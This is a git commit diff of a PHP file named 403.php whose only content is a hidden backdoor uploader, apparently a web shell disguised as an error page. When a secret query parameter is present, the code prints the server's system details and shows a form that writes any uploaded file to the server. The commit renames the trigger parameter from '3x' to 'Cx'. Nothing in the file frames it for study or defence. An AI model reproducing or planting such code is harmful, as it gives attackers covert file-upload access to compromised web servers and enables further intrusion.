d6711e6cc93bbf592546e26bd5720499a6b66d42
f4ruk1453decodex <133605406+f4ruk1453decodex@users.noreply.github.com>
2023-06-09 16:19:51 +0300

    Update 403.php

--- 403.php
+++ 403.php
@@ -1,5 +1,5 @@
 <?php 
-if ($_GET['3x']){
+if (isset($_GET['Cx'])){
     echo '<pre><p>EnfernalExV1</p>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
 }
 ?>
